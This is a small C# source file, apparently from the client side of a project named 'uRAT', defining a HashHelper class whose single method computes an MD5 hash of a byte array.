using System.Security.Cryptography;

namespace uRAT.Client.Tools
{
    public static class HashHelper
    {
        public static byte[] CalculateMd5(byte[] input)
        {
            var provider = new MD5CryptoServiceProvider();
            return provider.ComputeHash(input);
        }
    }
}
